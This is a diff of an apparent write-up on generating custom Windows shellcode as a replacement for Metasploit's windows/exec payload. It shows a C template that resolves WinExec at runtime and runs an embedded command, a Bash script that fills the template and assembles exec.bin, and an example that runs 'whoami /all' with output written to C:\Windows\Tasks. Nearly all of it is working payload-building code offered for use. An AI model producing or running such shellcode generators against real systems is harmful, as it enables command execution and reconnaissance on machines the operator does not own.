@@ -137,8 +137,8 @@ void exec() {
     CHAR winexec_c[] = {'W','i','n','E','x','e','c', 0};
     WinExecFunc = GetSymbolAddress((HANDLE)kernel32dll, winexec_c);
 
-    CHAR cmd_c[] = {'<CMD>'};
-    ((WINEXEC)WinExecFunc)(cmd_c, 0);
+    CHAR cmd_c[] = {'<CMD>', 0};
+    ((WINEXEC)WinExecFunc)(cmd_c, <SHOWWINDOW>);
 }
 ```
 
@@ -147,11 +147,20 @@ Then with a bit of Bash automation we get a working alternative for the MSF `win
 ```bash
 #!/usr/bin/env bash
 
-CMD=`echo "${1}" | grep -o . | sed -e ':a;N;$!ba;s/\n/\x27,\x27/g'`
-CMD="${CMD//\\/\\\\\\\\}"
-#echo $CMD
+# Usage:
+#   generate.sh <CMD> <SHOWWINDOW>
+# Examples:
+#   generate.sh 'calc.exe' 10
+#   generate.sh 'cmd /c "whoami /all" > C:\Windows\Tasks\out.txt' 0
 
-cat template.c | sed "s#<CMD>#${CMD}#g" > exec.c
+CMD="${1}"
+SHOWWINDOW="${2}"  # https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
+
+CMD=`echo "${CMD}" | grep -o . | sed -e ':a;N;$!ba;s/\n/\x27,\x27/g'`
+CMD="${CMD//\\/\\\\\\\\}"
+#echo -e "CHAR cmd_c[] = {'${CMD}'};\n((WINEXEC)WinExecFunc)(cmd_c, ${SHOWWINDOW});\n"
+
+cat template.c | sed "s#<CMD>#${CMD}#g" | sed "s#<SHOWWINDOW>#${SHOWWINDOW}#g" > exec.c
 
 nasm -f win64 adjuststack.asm -o adjuststack.o
 
@@ -171,8 +180,8 @@ rm exec.exe exec.o exec.c adjuststack.o
 
 Generate and execute:
 
-```bash
-./generate.sh 'cmd /c "whoami /all" > C:\Windows\Tasks\out.txt'
+```
+./generate.sh 'cmd /c "whoami /all" > C:\Windows\Tasks\out.txt' 0
 [*] Payload size: 640 bytes
 [+] Saved as: exec.bin
 ```
